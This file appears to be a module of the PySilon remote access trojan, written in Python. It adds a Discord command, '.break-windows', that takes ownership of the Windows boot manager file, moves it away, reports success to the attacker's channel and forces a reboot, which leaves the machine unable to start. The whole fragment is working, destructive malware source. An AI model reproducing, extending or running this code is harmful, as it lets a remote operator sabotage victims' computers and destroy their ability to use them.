import subprocess
import os
import shutil
# end of imports

# on message
elif message.content == '.break-windows':
    await message.delete()
    if IsAdmin():
        explorer_commands = [
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" /v Hidden /t REG_DWORD /d 1 /f',
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" /v ShowSuperHidden /t REG_DWORD /d 1 /f',
        ]

        file_commands = [
            'takeown /f "C:\\bootmgr"',
            'icacls "C:\\bootmgr" /grant %USERNAME%:(F)'
        ]

        for cmd in explorer_commands:
            subprocess.run(cmd, check=True)

        os.system("taskkill /f /im explorer.exe")
        os.system("start explorer.exe")

        for cmd in file_commands:
            subprocess.run(cmd)

        shutil.move("C:\\bootmgr", "C:\\pysilonontop")

        embed = discord.Embed(title="🟢 Success",description=f'```Successfully broke the Windows boot manager```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)

        os.system("shutdown /r /f /t 0")
    else:
        embed = discord.Embed(title="📛 Error",description=f'```Admin permissions are required to break Windows```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
